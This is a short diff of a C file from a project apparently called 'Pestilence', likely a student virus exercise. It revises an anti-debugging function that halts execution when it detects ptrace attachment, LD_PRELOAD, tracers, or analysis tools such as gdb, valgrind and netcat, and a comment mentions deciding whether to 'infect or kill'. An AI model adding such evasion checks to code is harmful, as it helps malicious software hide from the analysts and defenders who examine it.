@@ -10,24 +10,17 @@
 /*                                                                            */
 /* ************************************************************************** */
 
+#include <anti_debug.h>
 
-/*
-** check ptrace
-** check getenv
-** check allowed process
-*/
-
-#define FORBIDEN_PROCESS { "cat", "top", "htop", "gdb", "netcat", "ps", "valgrind", "lldb", NULL}
-
-char            stop_exection("encryptation shit")
+char            stop_exection(t_aes *aes)
 {
     const char *forbidens[] = FORBIDEN_PROCESS;
 
     if (getenv("LD_PRELOAD"))
         return (SUCCESS);
-    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == FAILURE)
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == FAILURE) // check if Pestilence is a child process, if is true it means it bein debuged
         return (SUCCESS);
-    if (check_tracers("encryptation shit"))
+    if (check_tracers(aes))
         return (SUCCESS);
     if (check_process((char **)&forbidens[0]))
         return (SUCCESS);
@@ -35,5 +28,5 @@ char            stop_exection("encryptation shit")
     return (FAILURE);
 }
 
-/* REMNEBER THAT RET SUCCES IF HAVE TO STOP */
+/* REMEMBER THAT RET SUCCES IF HAVE TO STOP */
 /* if this return false i have to just not infect or kill ??? */
